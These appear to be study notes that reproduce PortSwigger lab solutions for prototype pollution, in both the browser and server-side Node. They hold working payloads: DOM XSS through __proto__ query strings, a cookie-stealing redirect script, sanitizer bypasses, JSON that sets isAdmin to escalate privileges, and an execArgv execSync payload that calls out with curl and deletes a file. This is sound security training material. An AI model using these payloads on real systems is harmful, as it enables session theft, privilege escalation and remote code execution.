<!-- omit in toc -->
# Table of Contents
- [[#Client-side prototype pollution via browser APIs]]
- [[#DOM XSS via client-side prototype pollution]]
- [[#DOM XSS via an alternative prototype pollution vector]]
- [[#Client-side prototype pollution via flawed sanitization]]
- [[#Client-side prototype pollution in third-party libraries]]
- [[#Privilege escalation via server-side prototype pollution]]
- [[#Detecting server-side prototype pollution without polluted property reflection]]
- [[#Bypassing flawed input filters for server-side prototype pollution]]
- [[#Remote code execution via server-side prototype pollution]]


# Client-side prototype pollution via browser APIs
Reference: https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis

```ad-hint
title: DOM invader
1. Load the lab in Burp's built-in browser.
    
2. [Enable DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) and [enable the prototype pollution option](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution).
    
3. Open the browser DevTools panel, go to the **DOM Invader** tab, then reload the page.
    
4. Observe that DOM Invader has identified two prototype pollution vectors in the `search` property i.e. the query string.
    
5. Click **Scan for gadgets**. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.
    
6. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.
    
7. Observe that DOM Invader has successfully accessed the `script.src` sink via the `value` gadget.
    
8. Click **Exploit**. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.
```

```ad-done
title: Solution
**Find a prototype pollution source**

1. In your browser, try polluting `Object.prototype` by injecting an arbitrary property via the query string:
    
    ~~~
    /?__proto__[foo]=bar
    ~~~
1. Open the browser DevTools panel and go to the **Console** tab.
    
3. Enter `Object.prototype`.
    
4. Study the properties of the returned object and observe that your injected `foo` property has been added. You've successfully found a prototype pollution source.
    

**Identify a gadget**

1. In the browser DevTools panel, go to the **Sources** tab.
    
2. Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.
    
3. In `searchLoggerConfigurable.js`, notice that if the `config` object has a `transport_url` property, this is used to dynamically append a script to the DOM.
    
4. Observe that a `transport_url` property is defined for the `config` object, so this doesn't appear to be vulnerable.
    
5. Observe that the next line uses the `Object.defineProperty()` method to make the `transport_url` unwritable and unconfigurable. However, notice that it doesn't define a `value` property.
    

**Craft an exploit**

1. Using the prototype pollution source you identified earlier, try injecting an arbitrary value property:
    
    ~~~
    /?__proto__[value]=foo
    ~~~
1. In the browser DevTools panel, go to the **Elements** tab and study the HTML content of the page. Observe that a `<script>` element has been rendered on the page, with the `src` attribute `foo`.
    
3. Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a `data:` URL as follows:
    
    ~~~
    /?__proto__[value]=data:,alert(1);
    ~~~
1. Observe that the `alert(1)` is called and the lab is solved.
```

# DOM XSS via client-side prototype pollution
Reference: https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution
```ad-hint
title: DOM invader
1. Open the lab in Burp's built-in browser.
    
2. [Enable DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) and [enable the prototype pollution option](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution).
    
3. Open the browser DevTools panel, go to the **DOM Invader** tab, then reload the page.
    
4. Observe that DOM Invader has identified two prototype pollution vectors in the `search` property i.e. the query string.
    
5. Click **Scan for gadgets**. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.
    
6. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.
    
7. Observe that DOM Invader has successfully accessed the `script.src` sink via the `transport_url` gadget.
    
8. Click **Exploit**. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.
```

```ad-done
title: Solution
**Find a prototype pollution source**

1. In your browser, try polluting `Object.prototype` by injecting an arbitrary property via the query string:
    
    ~~~
    /?__proto__[foo]=bar
    ~~~
1. Open the browser DevTools panel and go to the **Console** tab.
    
3. Enter `Object.prototype`.
    
4. Study the properties of the returned object. Observe that it now has a `foo` property with the value `bar`. You've successfully found a prototype pollution source.
    

**Identify a gadget**

1. In the browser DevTools panel, go to the **Sources** tab.
    
2. Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.
    
3. In `searchLogger.js`, notice that if the `config` object has a `transport_url` property, this is used to dynamically append a script to the DOM.
    
4. Notice that no `transport_url` property is defined for the `config` object. This is a potential gadget for controlling the `src` of the `<script>` element.
    

**Craft an exploit**

1. Using the prototype pollution source you identified earlier, try injecting an arbitrary `transport_url` property:
    
    ~~~
    /?__proto__[transport_url]=foo
    ~~~
1. In the browser DevTools panel, go to the **Elements** tab and study the HTML content of the page. Observe that a `<script>` element has been rendered on the page, with the `src` attribute `foo`.
    
3. Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a `data:` URL as follows:
    
    ~~~
    /?__proto__[transport_url]=data:,alert(1);
    ~~~
1. Observe that the `alert(1)` is called and the lab is solved.
```
# DOM XSS via an alternative prototype pollution vector
Reference: https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector

```ad-hint
title: DOM invader
1. Load the lab in Burp's built-in browser.
    
2. [Enable DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) and [enable the prototype pollution option](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution).
    
3. Open the browser DevTools panel and go to the **DOM Invader** tab and reload the page.
    
4. Observe that DOM Invader has identified a prototype pollution vector in the `search` property i.e. the query string.
    
5. Click **Scan for gadgets**. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.
    
6. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.
    
7. Observe that DOM Invader has successfully accessed the `eval()` sink via the `sequence` gadget.
    
8. Click **Exploit**. Observe that DOM Invader's auto-generated proof-of-concept doesn't trigger an `alert()`.
    
9. Go back to the previous browser tab and look at the `eval()` sink again in DOM Invader. Notice that following the closing canary string, a numeric `1` character has been appended to the payload.
    
10. Click **Exploit** again. In the new tab that loads, append a minus character (`-`) to the URL and reload the page.
    
11. Observe that the `alert(1)` is called and the lab is solved.
```

```ad-done
title: Solution
**Find a prototype pollution source**

1. In your browser, try polluting `Object.prototype` by injecting an arbitrary property via the query string:
    
    ~~~
    /?__proto__[foo]=bar
    ~~~
1. Open the browser DevTools panel and go to the **Console** tab.
    
3. Enter `Object.prototype`.
    
4. Study the properties of the returned object and observe that your injected `foo` property has not been added.
    
5. Back in the query string, try using an alternative prototype pollution vector:
    
    ~~~
    /?__proto__.foo=bar
    ~~~
1. In the console, enter `Object.prototype` again. Notice that it now has its own `foo` property with the value `bar`. You've successfully found a prototype pollution source.
    

**Identify a gadget**

1. In the browser DevTools panel, go to the **Sources** tab.
    
2. Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.
    
3. Notice that there is an `eval()` sink in `searchLoggerAlternative.js`.
    
4. Notice that the `manager.sequence` property is passed to `eval()`, but this isn't defined by default.
    

**Craft an exploit**

1. Using the prototype pollution source you identified earlier, try injecting an arbitrary `sequence` property containing an XSS proof-of-concept payload:
    
    ~~~
    /?__proto__.sequence=alert(1)
    ~~~
1. Observe that the payload doesn't execute.
    
3. In the browser DevTools panel, go to the **Console** tab. Observe that you have triggered an error.
    
4. Click the link at the top of the stack trace to jump to the line where `eval()` is called.
    
5. Click the line number to add a breakpoint to this line, then refresh the page.
    
6. Hover the mouse over the `manager.sequence` reference and observe that its value is `alert(1)1`. This indicates that we have successfully passed our payload into the sink, but a numeric `1` character is being appended to it, resulting in invalid JavaScript syntax.
    
7. Click the line number again to remove the breakpoint, then click the play icon at the top of the browser window to resume code execution.
    
8. Add trailing minus character to the payload to fix up the final JavaScript syntax:
    
    ~~~
    /?__proto__.sequence=alert(1)-
    ~~~
1. Observe that the `alert(1)` is called and the lab is solved.
```

# Client-side prototype pollution via flawed sanitization
Reference: https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization

```ad-done
title: Solution
**Find a prototype pollution source**

1. In your browser, try polluting `Object.prototype` by injecting an arbitrary property via the query string:
    
    ~~~
    /?__proto__.foo=bar
    ~~~
1. Open the browser DevTools panel and go to the **Console** tab.
    
3. Enter `Object.prototype`.
    
4. Study the properties of the returned object and observe that your injected `foo` property has not been added.
    
5. Try alternative prototype pollution vectors. For example:
    
    ~~~
    /?__proto__[foo]=bar /?constructor.prototype.foo=bar
    ~~~
1. Observe that in each instance, `Object.prototype` is not modified.
    
7. Go to the **Sources** tab and study the JavaScript files that are loaded by the target site. Notice that `deparamSanitized.js` uses the `sanitizeKey()` function defined in `searchLoggerFiltered.js` to strip potentially dangerous property keys based on a blocklist. However, it does not apply this filter recursively.
    
8. Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitization process. For example:
    
    ~~~
    /?__pro__proto__to__[foo]=bar /?__pro__proto__to__.foo=bar /?constconstructorructor.[protoprototypetype][foo]=bar /?constconstructorructor.protoprototypetype.foo=bar
    ~~~
1. In the console, enter `Object.prototype` again. Notice that it now has its own `foo` property with the value `bar`. You've successfully found a prototype pollution source and bypassed the website's key sanitization.
    

**Identify a gadget**

1. Study the JavaScript files again and notice that `searchLogger.js` dynamically appends a script to the DOM using the `config` object's `transport_url` property if present.
    
2. Notice that no `transport_url` property is set for the `config` object. This is a potential gadget.
    

**Craft an exploit**

1. Using the prototype pollution source you identified earlier, try injecting an arbitrary `transport_url` property:
    
    `/?__pro__proto__to__[transport_url]=foo`
2. In the browser DevTools panel, go to the **Elements** tab and study the HTML content of the page. Observe that a <script> element has been rendered on the page, with the `src` attribute `foo`.
    
3. Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a `data:` URL as follows:
    
    ~~~
    /?__pro__proto__to__[transport_url]=data:,alert(1);
    ~~~
1. Observe that the `alert(1)` is called and the lab is solved.
```

# Client-side prototype pollution in third-party libraries
Reference: https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries

```ad-done
title: Solution
1. Load the lab in Burp's built-in browser.
    
2. [Enable DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) and [enable the prototype pollution option](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution).
    
3. Open the browser DevTools panel, go to the **DOM Invader** tab, then reload the page.
    
4. Observe that DOM Invader has identified two prototype pollution vectors in the `hash` property i.e. the URL fragment string.
    
5. Click **Scan for gadgets**. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.
    
6. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.
    
7. Observe that DOM Invader has successfully accessed the `setTimeout()` sink via the `hitCallback` gadget.
    
8. Click **Exploit**. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.
    
9. Disable DOM Invader.
    
10. In the browser, go to the lab's exploit server.
    
11. In the **Body** section, craft an exploit that will navigate the victim to a malicious URL as follows:
    
    ~~~html
    <script> location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29" </script>
    ~~~
1. Test the exploit on yourself, making sure that you're navigated to the lab's home page and that the `alert(document.cookie)` payload is triggered.
    
13. Go back to the exploit server and deliver the exploit to the victim to solve the lab.
```

# Privilege escalation via server-side prototype pollution
Reference: https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution

```ad-done
title: Solution
##### Study the address change feature

1. Log in and visit your account page. Submit the form for updating your billing and delivery address.
    
2. In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
    
3. Observe that when you submit the form, the data from the fields is sent to the server as JSON.
    
4. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
    
5. Send the request to Burp Repeater.
    

##### Identify a prototype pollution source

1. In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with an arbitrary property:
    
    ~~~
    "__proto__": { "foo":"bar" }
    ~~~
1. Send the request.
    
3. Notice that the object in the response now includes the arbitrary property that you injected, but no `__proto__` property. This strongly suggests that you have successfully polluted the object's prototype and that your property has been inherited via the prototype chain.
    

##### Identify a gadget

1. Look at the additional properties in the response body.
    
2. Notice the `isAdmin` property, which is currently set to `false`.
    

##### Craft an exploit

1. Modify the request to try polluting the prototype with your own `isAdmin` property:
    
    ~~~
    "__proto__": { "isAdmin":true }
    ~~~
    
1. Send the request. Notice that the `isAdmin` value in the response has been updated. This suggests that the object doesn't have its own `isAdmin` property, but has instead inherited it from the polluted prototype.
    
3. In the browser, refresh the page and confirm that you now have a link to access the admin panel.
    
4. Go to the admin panel and delete `carlos` to solve the lab.
```

# Detecting server-side prototype pollution without polluted property reflection
Reference: https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection

```ad-done
title: Solution
##### Study the address change feature

1. Log in and visit your account page. Submit the form for updating your billing and delivery address.
    
2. In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
    
3. Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
    
4. Send the request to Burp Repeater.
    
5. In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with an arbitrary property:
    
    ~~~
    "__proto__": { "foo":"bar" }
    ~~~
1. Send the request. Observe that the object in the response does not reflect the injected property. However, this doesn't necessarily mean that the application isn't vulnerable to prototype pollution.
    

##### Identify a prototype pollution source

1. In the request, modify the JSON in a way that intentionally breaks the syntax. For example, delete a comma from the end of one of the lines.
    
2. Send the request. Observe that you receive an error response in which the body contains a JSON error object.
    
3. Notice that although you received a `500` error response, the error object contains a `status` property with the value `400`.
    
4. In the request, make the following changes:
    
    - Fix the JSON syntax by reversing the changes that triggered the error.
        
    - Modify your injected property to try polluting the prototype with your own distinct `status` property. Remember that this must be between 400 and 599.
        
        ~~~
        "__proto__": { "status":555 }
        ~~~
1. Send the request and confirm that you receive the normal response containing your user object.
    
6. Intentionally break the JSON syntax again and reissue the request.
    
7. Notice that this time, although you triggered the same error, the `status` and `statusCode` properties in the JSON response match the arbitrary error code that you injected into `Object.prototype`. This strongly suggests that you have successfully polluted the prototype and the lab is solved.
```

# Bypassing flawed input filters for server-side prototype pollution
Reference: https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution

```ad-done
title: Solution
##### Study the address change feature

1. Log in and visit your account page. Submit the form for updating your billing and delivery address.
    
2. In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
    
3. Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
    
4. Send the request to Burp Repeater.
    

##### Identify a prototype pollution source

1. In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with a `json spaces` property.
    
    ~~~
    "__proto__": { "json spaces":10 }
    ~~~
1. Send the request.
    
3. In the **Response** panel, switch to the **Raw** tab. Observe that the JSON indentation appears to be unaffected.
    
4. Modify the request to try polluting the prototype via the `constructor` property instead:
    
    ~~~
    "constructor": { "prototype": { "json spaces":10 } }
    ~~~
1. Resend the request.
    
6. In the **Response** panel, go to the **Raw** tab. This time, notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype.
    

##### Identify a gadget

1. Look at the additional properties in the response body.
    
2. Notice the `isAdmin` property, which is currently set to `false`.
    

##### Craft an exploit

1. Modify the request to try polluting the prototype with your own `isAdmin` property:
    
    ~~~
    "constructor": { "prototype": { "isAdmin":true } }
    ~~~
1. Send the request. Notice that the `isAdmin` value in the response has been updated. This suggests that the object doesn't have its own `isAdmin` property, but has instead inherited it from the polluted prototype.
    
3. In the browser, refresh the page and confirm that you now have a link to access the admin panel.
    
4. Go to the admin panel and delete `carlos` to solve the lab.
```

# Remote code execution via server-side prototype pollution
Reference: https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution

```ad-done
title: Solution
##### Study the address change feature

1. Log in and visit your account page. Submit the form for updating your billing and delivery address.
    
2. In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
    
3. Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
    
4. Send the request to Burp Repeater.
    

##### Identify a prototype pollution source

1. In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with a `json spaces` property.
    
    ~~~
    "__proto__": { "json spaces":10 }
    ~~~
1. Send the request.
    
3. In the **Response** panel, switch to the **Raw** tab. Notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype.
    

##### Probe for remote code execution

1. In the browser, go to the admin panel and observe that there's a button for running maintenance jobs.
    
2. Click the button and observe that this triggers background tasks that clean up the database and filesystem. This is a classic example of the kind of functionality that may spawn node child processes.
    
3. Try polluting the prototype with a malicious `execArgv` property that adds the `--eval` argument to the spawned child process. Use this to call the `execSync()` sink, passing in a command that triggers an interaction with the public Burp Collaborator server. For example:
    
    ~~~
    "__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" ] }
    ~~~
1. Send the request.
    
5. In the browser, go to the admin panel and trigger the maintenance jobs again. Notice that these have both failed this time.
    
6. In Burp, go to the **Collaborator** tab and poll for interactions. Observe that you have received several DNS interactions, confirming the remote code execution.
    

##### Craft an exploit

1. In Repeater, replace the `curl` command with a command for deleting Carlos's file:
    
    ~~~
    "__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }
    ~~~
1. Send the request.
    
3. Go back to the admin panel and trigger the maintenance jobs again. Carlos's file is deleted and the lab is solved.
```